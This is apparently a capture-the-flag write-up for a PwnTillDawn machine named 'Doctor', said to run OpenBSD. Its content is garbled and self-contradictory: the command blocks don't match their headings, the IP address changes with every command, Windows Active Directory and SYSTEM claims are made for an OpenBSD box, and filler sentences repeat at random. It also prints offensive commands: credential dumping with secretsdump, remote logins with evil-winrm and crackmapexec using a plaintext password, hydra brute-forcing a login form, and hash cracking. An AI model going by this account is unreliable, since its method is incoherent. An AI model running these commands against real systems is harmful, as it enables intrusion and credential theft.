---
TitleSEO: "PwnTillDawn — Doctor (Easy OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Doctor (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Doctor. ACL Abuse and SQL Injection to achieve easy compromise on OpenBSD."
Keywords: "offsec, hard, easy, medium, pwntilldawn, ctf, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-doctor-597.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-doctor-597/"
Date: "2024-12-18"
Tags: "OffSec, Hard, Easy, Medium, PwnTillDawn, CTF, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-doctor-597"
Permalink: "/writeups/htb-doctor-597.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Doctor** is rated **Easy** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.15.47.175`.

### Objectives

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
nmap -sCV -p587,139,143 10.41.90.113 -oN scan.txt
evil-winrm -i 10.39.153.42 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.62.75.110 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.121.113.123
```

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

### SMB Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.103.12.130 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

Key finding: **ACL Abuse**.

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

### Initial Access

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.48.45.110/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p5432,135,25 10.26.3.20 -oN scan.txt
```

Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.95.10.96 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.82.136.154/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.80.115.152
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `GetNPUsers`
- `kerbrute`
- `crackmapexec`
- `msfvenom`
- `ffuf`

### Key Takeaways

- ACL Abuse
- SQL Injection
- Pass the Hash
